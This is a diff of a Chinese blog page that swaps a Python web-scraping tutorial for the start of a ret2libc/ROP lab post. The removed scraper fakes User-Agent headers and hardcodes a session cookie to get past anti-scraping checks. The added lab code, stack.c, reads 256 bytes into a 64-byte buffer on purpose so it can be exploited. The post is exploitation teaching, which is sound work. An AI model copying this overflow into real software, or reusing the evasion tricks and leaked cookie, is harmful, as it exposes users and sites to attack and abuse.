@@ -4,16 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="py爬虫, 樱花树  |  信息安全">
-    <meta name="description" content="爬虫
-从本质上说，就是利用程序在网上拿到对我们有用的数据
-实际上爬虫就是使用编程语言所编写的程序，作用是从网络上获取有价值的数据，重要的就是速度比手动获取数据快
+    <meta name="keywords" content="樱花树  |  信息安全">
+    <meta name="description" content="实验环境操作系统 &amp;amp; 工具
+操作系统：5.16.0-kali7-amd64
 
-
-爬取网页视频
-使用python程序替浏览器发请求，接收响应
-
-安装第三方软">
+pwntools
+apt-get update
+apt-get install python3 python3-pip python3-dev git l">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -25,7 +22,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>py爬虫 | 樱桃会长成樱花树吗</title>
+    <title>樱桃会长成樱花树吗</title>
     <link rel="icon" type="image/jpeg" href="https://s1.ax1x.com/2022/03/09/bRiaVO.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -534,12 +531,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">py爬虫</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -653,25 +650,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/python/">
-                                <span class="chip bg-color">python</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/note/" class="post-category">
-                                note
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -680,21 +664,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-10
+                    2022-04-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-10
+                    2022-04-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    1.1k
                 </div>
                 
 
@@ -716,335 +700,216 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><ul>
-<li>从本质上说，就是利用程序在网上拿到对我们有用的数据</li>
-<li>实际上爬虫就是使用编程语言所编写的程序，作用是从网络上获取有价值的数据，重要的就是速度比手动获取数据快</li>
-<li><img src="/2022/03/10/py%E7%88%AC%E8%99%AB/image-20210925091927888.png"></li>
-</ul>
-<h1 id="爬取网页视频"><a href="#爬取网页视频" class="headerlink" title="爬取网页视频"></a>爬取网页视频</h1><ul>
-<li><p>使用<code>python</code>程序替浏览器发请求，接收响应</p>
-<ul>
-<li><p>安装第三方软件<code>requests</code>，使用<code>pip install requests</code></p>
+                <h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><h2 id="操作系统-amp-工具"><a href="#操作系统-amp-工具" class="headerlink" title="操作系统 &amp; 工具"></a>操作系统 &amp; 工具</h2><ul>
+<li><p>操作系统：<code>5.16.0-kali7-amd64</code></p>
 </li>
-<li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-
-url<span class="token operator">=</span><span class="token string">'https://www.baidu.com/'</span> <span class="token comment" spellcheck="true">#请求的网址，请求的方式位get,所以使用request的get方法</span>
-resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
-</code></pre>
-</li>
-<li><p>得到一个响应码，200表示成功，418表示遭到反爬</p>
-</li>
-<li><p>运行上述代码会得到</p>
-<ul>
-<li><img src="/2022/03/10/py%E7%88%AC%E8%99%AB/image-20210925093614674.png"></li>
-</ul>
-</li>
-<li><p>为防止被检测到，需要更改<code>UA</code></p>
-</li>
-<li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-
-url<span class="token operator">=</span><span class="token string">'https://www.baidu.com/'</span> <span class="token comment" spellcheck="true">#请求的网址，请求的方式位get,所以使用request的get方法</span>
-headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52'</span><span class="token punctuation">}</span>
-resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#请求响应码</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#请求头</span>
-</code></pre>
-</li>
-<li><p>得到</p>
-<ul>
-<li><img src="/2022/03/10/py%E7%88%AC%E8%99%AB/image-20210925094020847.png"></li>
-<li>可防止初级的反爬</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>正则表达式</p>
-<ul>
-<li>正则表达式(Regular Expression)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）。</li>
-<li>正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。</li>
-<li>——》菜鸟教程</li>
-</ul>
-</li>
-<li><p>利用正则表达式提取<code>resp.text</code>中的内容</p>
-<ul>
-<li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">import</span> re<span class="token comment" spellcheck="true">#引入正则表达式</span>
-<span class="token keyword">import</span> time
-
-url<span class="token operator">=</span><span class="token string">'https://www.qiushibaike.com/video/'</span> <span class="token comment" spellcheck="true">#请求的网址，请求的方式位get,所以使用request的get方法</span>
-headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52'</span><span class="token punctuation">}</span>
-resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#第一个参数为规则，第二个参数为查找的内容;“.”代表任意字符，“*”代表任意个</span>
-info <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;source src="(.*)" type=\'video/mp4\' />'</span><span class="token punctuation">,</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#info是列表</span>
-lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
-<span class="token keyword">for</span> item <span class="token keyword">in</span> info<span class="token punctuation">:</span>
-    lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'https:'</span><span class="token operator">+</span>item<span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#print(lst)</span>
-
-<span class="token comment" spellcheck="true">#下载视频，一个一个发请求</span>
-count<span class="token operator">=</span><span class="token number">0</span>
-<span class="token keyword">for</span> index<span class="token punctuation">,</span>item <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>item<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第{0}个视频于{1}开始下载"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">,</span>time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-    count<span class="token operator">+=</span><span class="token number">1</span>
-    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'video/'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.mp4'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> dir<span class="token punctuation">:</span>
-        <span class="token comment" spellcheck="true">#写入本地磁盘</span>
-        dir<span class="token punctuation">.</span>write<span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
-
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第{0}个视频于{1}下载结束"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">,</span>time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-</code></pre>
-</li>
-<li><p><code>text</code>和<code>context</code></p>
-<ul>
-<li>前者是文本，后者是二进制文件</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="京东数据可视化分析"><a href="#京东数据可视化分析" class="headerlink" title="京东数据可视化分析"></a>京东数据可视化分析</h1><ul>
-<li><p>分析有效的<code>url</code>，及数据的形式</p>
-<ul>
-<li><p>静态数据与动态数据</p>
-<ul>
-<li>静态数据：服务器端已经渲染好的内容，直接发给浏览器，浏览器直接解释执行</li>
-<li>动态数据：点击下一页，数据栏未发生变化，说明数据时后来被渲染到HTML中的</li>
-</ul>
-</li>
-<li><p><code>f12</code>找到评论数据的请求，打开对应的<code>url</code>，复制信息到<code>json.cn</code>进行解析（注意去掉多的内容）</p>
-</li>
-</ul>
-</li>
-<li><p>编写<code>python</code>向服务器发送请求获取数据</p>
-<ul>
-<li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">import</span> json
-<span class="token keyword">import</span> time
-<span class="token keyword">import</span> openpyxl <span class="token comment" spellcheck="true">#用于操作excel</span>
-
-<span class="token comment" spellcheck="true">#获取评论</span>
-<span class="token keyword">def</span> <span class="token function">getComment</span><span class="token punctuation">(</span>productId<span class="token punctuation">,</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token comment" spellcheck="true">#发送请求</span>
-   url<span class="token operator">=</span><span class="token string">'https://club.jd.com/comment/productPageComments.action?callback=fetchJSON_comment98&amp;productId={0}&amp;score=0&amp;sortType=5&amp;page={1}&amp;pageSize=10&amp;isShadowSku=0&amp;fold=1'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>productId<span class="token punctuation">,</span>page<span class="token punctuation">)</span>
-    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52'</span><span class="token punctuation">}</span>
-    resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#    if url==None:</span>
-<span class="token comment" spellcheck="true">#        print('爬取失败')</span>
-<span class="token comment" spellcheck="true">#    else:</span>
-<span class="token comment" spellcheck="true">#        print('爬取成功')</span>
-
-    <span class="token comment" spellcheck="true">#显示输出,去掉多余的</span>
-    s<span class="token operator">=</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'fetchJSON_comment98('</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
-    s<span class="token operator">=</span>s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">');'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
-
-    <span class="token comment" spellcheck="true">#json解析</span>
-    json_data<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> json_data
-
-<span class="token comment" spellcheck="true">#获取最大页数</span>
-<span class="token keyword">def</span> <span class="token function">getMaxPage</span><span class="token punctuation">(</span>productId<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    dic_data<span class="token operator">=</span>getComment<span class="token punctuation">(</span>productId<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#向服务器发送请求，获取字典信息</span>
-    <span class="token keyword">return</span> dic_data<span class="token punctuation">[</span><span class="token string">'maxPage'</span><span class="token punctuation">]</span>
-
-<span class="token comment" spellcheck="true">#提取数据</span>
-<span class="token keyword">def</span> <span class="token function">getInfo</span><span class="token punctuation">(</span>productId<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token comment" spellcheck="true">#max_page=getMaxPage() 不能爬取太多，否则会被封ip</span>
-    max_page<span class="token operator">=</span><span class="token number">1</span>
-    lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#存储提取到的数据</span>
-    <span class="token keyword">for</span> page <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>max_page<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        comments<span class="token operator">=</span>getComment<span class="token punctuation">(</span>productId<span class="token punctuation">,</span>page<span class="token punctuation">)</span>
-        commentList<span class="token operator">=</span>comments<span class="token punctuation">[</span><span class="token string">'comments'</span><span class="token punctuation">]</span>
-        <span class="token comment" spellcheck="true">#遍历列表，获取每条评论的内容，颜色，鞋码</span>
-        <span class="token keyword">for</span> item <span class="token keyword">in</span> commentList<span class="token punctuation">:</span>
-            content<span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>
-            color<span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token string">'productColor'</span><span class="token punctuation">]</span>
-            size<span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token string">'productSize'</span><span class="token punctuation">]</span>
-            lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>content<span class="token punctuation">,</span>color<span class="token punctuation">,</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将每条评论信息添加到列表中</span>
-        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#延迟时间，防止太快，被封ip</span>
-    save<span class="token punctuation">(</span>lst<span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#存储到excel中</span>
-<span class="token keyword">def</span> <span class="token function">save</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    wk<span class="token operator">=</span>openpyxl<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#创建工作簿对象（即使一个.xlsx文件）</span>
-    sheet<span class="token operator">=</span>wk<span class="token punctuation">.</span>active <span class="token comment" spellcheck="true">#获取活动表</span>
-
-    <span class="token comment" spellcheck="true">#遍历列表，把数据添加到工作表中，列表中的数据在excel中是一行</span>
-    <span class="token keyword">for</span> item <span class="token keyword">in</span> lst<span class="token punctuation">:</span>
-        sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">)</span>
-
-    wk<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'销售数据.xlsx'</span><span class="token punctuation">)</span>
-
-
-<span class="token comment" spellcheck="true">#测试</span>
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    productId<span class="token operator">=</span><span class="token string">'30890079142'</span>
-    getInfo<span class="token punctuation">(</span>productId<span class="token punctuation">)</span>
+<li><p><code>pwntools</code></p>
+<pre><code>apt-get update
+apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
+python3 -m pip install --upgrade pip
+python3 -m pip install --upgrade pwntools
 </code></pre>
 </li>
 </ul>
-</li>
-<li><p>进行数据分析</p>
+<p>Tips：由于需要在命令行中使用<code>cyclic、readelf、ropper</code>等工具，需要将工具的所在位置<code>“/home/kali/.local/bin”</code>添加到<code>PATH</code>中，这里采用了<a target="_blank" rel="noopener" href="https://blog.csdn.net/zerolity/article/details/78505455?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;utm_relevant_index=2">方法二</a></p>
 <ul>
-<li><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#数据分析</span>
-<span class="token comment" spellcheck="true">#分析不同码数鞋子的销量</span>
-
-<span class="token keyword">import</span> openpyxl
-<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pit
-
-wk<span class="token operator">=</span>openpyxl<span class="token punctuation">.</span>load_workbook<span class="token punctuation">(</span><span class="token string">'销售数据.xlsx'</span><span class="token punctuation">)</span>
-sheet<span class="token operator">=</span>wk<span class="token punctuation">.</span>active  <span class="token comment" spellcheck="true">#获取活动sheet表</span>
-
-<span class="token comment" spellcheck="true">#获取最大行数和最大列数</span>
-row<span class="token operator">=</span>sheet<span class="token punctuation">.</span>max_row
-col<span class="token operator">=</span>sheet<span class="token punctuation">.</span>max_column
-<span class="token comment" spellcheck="true">#print(row,col)</span>
-
-lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#用于存出鞋码</span>
-<span class="token comment" spellcheck="true">#读取鞋码</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    size<span class="token operator">=</span>sheet<span class="token punctuation">.</span>cell<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token comment" spellcheck="true">#cell表示sheet的单元格</span>
-    lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#开始统计数据，统计不同码数鞋子的销量</span>
-<span class="token comment" spellcheck="true">#使用字典，鞋码作键，销量作值</span>
-dicSize<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
-<span class="token keyword">for</span> item <span class="token keyword">in</span> lst<span class="token punctuation">:</span>
-    dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>
-
-<span class="token keyword">for</span> item <span class="token keyword">in</span> lst<span class="token punctuation">:</span>
-    dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token operator">=</span>dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span>
-
-<span class="token comment" spellcheck="true">#输出数据</span>
-<span class="token comment" spellcheck="true">#for item in dicSize:</span>
-<span class="token comment" spellcheck="true">#    print(item,dicSize[item])</span>
-lst_total<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
-<span class="token keyword">for</span> item <span class="token keyword">in</span> dicSize<span class="token punctuation">:</span>
-    lst_total<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>item<span class="token punctuation">,</span>dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">,</span>dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token operator">/</span><span class="token number">100</span><span class="token operator">*</span><span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token keyword">for</span> item <span class="token keyword">in</span> lst_total<span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#进行可视化数据统计</span>
-labels<span class="token operator">=</span><span class="token punctuation">[</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> lst_total<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#使用列表生成式</span>
-fraces<span class="token operator">=</span><span class="token punctuation">[</span>item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> lst_total<span class="token punctuation">]</span>
-pit<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#适应中文</span>
-pit<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token operator">=</span>fraces<span class="token punctuation">,</span>labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%1.1f%%'</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#pit.show()</span>
-pit<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span><span class="token string">'图.png'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#savefig要放在show前面执行，不然会显示空白</span>
+<li><p><code>pwngdb</code></p>
+<pre><code>git clone https://github.com/pwndbg/pwndbg
+cd pwndbg
+./setup.sh
 </code></pre>
 </li>
 </ul>
-</li>
-</ul>
-<h1 id="爬取12306车次信息"><a href="#爬取12306车次信息" class="headerlink" title="爬取12306车次信息"></a>爬取12306车次信息</h1><ul>
-<li><p><code>chrome</code>分析网站</p>
-<ul>
-<li><code>elements</code>：元素<code>HTML</code>，<code>css</code>，<code>js</code></li>
-<li><code>console</code></li>
-<li><code>Source</code>：相当于文件夹，<code>elements</code>，<code>js</code>，<code>css</code>等</li>
-<li><code>network</code>：所有发送的请求</li>
-</ul>
-</li>
-<li><p>如何爬取数据</p>
-<ul>
-<li><img src="/2022/03/10/py%E7%88%AC%E8%99%AB/image-20210927091331789.png"></li>
-<li></li>
-</ul>
-</li>
-<li><p>功能封装函数提取</p>
-</li>
-<li><p>爬取12306车次数据</p>
-<ul>
-<li>爬取车次数据后发现车站名称有英文简称，在<code>js</code>栏中可以找到<code>station_name</code>进行分析</li>
-</ul>
-</li>
-<li><p><code>json</code>数据解析</p>
-</li>
-<li><p>正则表达式提取数据</p>
-<ul>
-<li><code>[\u4e00-\u9fa5]</code>代表全部的汉字</li>
-</ul>
-</li>
-<li><p>数据展示</p>
-</li>
-<li><p>完整代码</p>
-<ul>
-<li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">import</span> re
+<p>安装成功后结果如图</p>
+<p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420192235374.png" alt="image-20220420192235374"></p>
+<h2 id="待rop程序"><a href="#待rop程序" class="headerlink" title="待rop程序"></a>待<code>rop</code>程序</h2><pre class=" language-c++"><code class="language-c++">/* stack.c */
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <dlfcn.h>
 
-<span class="token comment" spellcheck="true">#代替浏览器发送请求</span>
-<span class="token keyword">def</span> <span class="token function">sendRequset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    url<span class="token operator">=</span><span class="token string">'https://kyfw.12306.cn/otn/leftTicket/queryY?leftTicketDTO.train_date=2021-09-27&amp;leftTicketDTO.from_station=BJP&amp;leftTicketDTO.to_station=TJP&amp;purpose_codes=ADULT'</span>
-    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 Edg/94.0.992.31'</span><span class="token punctuation">,</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'_uab_collina=163270470989732643680974; JSESSIONID=3B9AFBC05E0BD1CD80AF6BC2C261E466; BIGipServerotn=3990290698.50210.0000; BIGipServerpassport=803733770.50215.0000; guidesStatus=off; highContrastMode=defaltMode; cursorStatus=off; RAIL_EXPIRATION=1633025496474; RAIL_DEVICEID=r-BfdT9ZoSUFu8mDnx4vo8tqNI_FJsOg_yhnqUn4X8my8cVtiZS9YdNYxKHeftzfftX-chAnhrrTxEkcbpG5DpiXJ0U4s-Rcyz5-LYa9cQZUGZLQ4H97ygypQeuIMbEXk9CYRijmQRQBzFi90NDhwsXfWvTbT43k; route=9036359bb8a8a461c164a04f8f50b252; _jc_save_fromStation=%u5317%u4EAC%2CBJP; _jc_save_toStation=%u5929%u6D25%2CTJP; _jc_save_fromDate=2021-09-27; _jc_save_toDate=2021-09-27; _jc_save_wfdc_flag=dc; BIGipServerportal=3168010506.17695.0000'</span><span class="token punctuation">}</span>
-    resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#加headers的UA后仍然被反爬，再加cookie后得到正确数据，如果还不行则继续加headers</span>
+void start() {
+  printf("IOLI Crackme Level 0x00\n");
+  printf("Password:");
 
-    <span class="token comment" spellcheck="true">#设置编码格式,在网站element栏搜索charset找出编码格式</span>
-    resp<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span>
-        <span class="token comment" spellcheck="true">#print(resp.text)</span>
-    <span class="token keyword">return</span> resp
+  char buf[64];
+  memset(buf, 0, sizeof(buf));
+  read(0, buf, 256);
 
+  if (!strcmp(buf, "250382"))
+    printf("Password OK :)\n");
+  else
+    printf("Invalid Password!\n");
+}
 
-<span class="token comment" spellcheck="true">#提取车次信息具体数据</span>
-<span class="token keyword">def</span> <span class="token function">parseJson</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span>stationName<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token comment" spellcheck="true">#将响应结果转为json</span>
-    jsonTicket<span class="token operator">=</span>resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    lstTicket<span class="token operator">=</span>jsonTicket<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#提取车次列表</span>
+int main(int argc, char *argv[]) {
 
-    <span class="token comment" spellcheck="true">#遍历每个车次信息，以“|”为分隔符分割</span>
-    <span class="token comment" spellcheck="true">#[3]表示车次，[6]查询起始站，[7]查询到达站，[31]一等座，[30]表示二等座，[13]表示出行时间</span>
-    lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#存储上述信息</span>
-    <span class="token keyword">for</span> item <span class="token keyword">in</span> lstTicket<span class="token punctuation">:</span>
-        d<span class="token operator">=</span>item<span class="token punctuation">.</span>split<span class="token punctuation">(</span>sep<span class="token operator">=</span><span class="token string">'|'</span><span class="token punctuation">)</span>
-        lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>d<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stationName<span class="token punctuation">[</span>d<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stationName<span class="token punctuation">[</span>d<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span 